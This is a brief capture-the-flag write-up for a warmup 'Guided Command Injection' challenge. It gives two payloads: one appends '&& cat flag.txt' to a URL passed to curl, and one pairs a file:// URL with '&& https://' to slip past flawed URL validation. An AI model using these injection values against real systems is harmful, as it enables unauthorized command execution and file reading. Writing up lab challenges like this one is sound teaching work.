# Guided Command Injection

Author: reyes

> The guide and source is located at `/guide`. Have fun!

**Difficulty: Warmup**

## Solution

Intended solution: `http://example.com/ && cat flag.txt`
completes the curl command with a dummy url and cats the flag.

Due to intentional flawed url validation which was meant to prevent usage of file url scheme: `file:///app/flag.txt && https://`
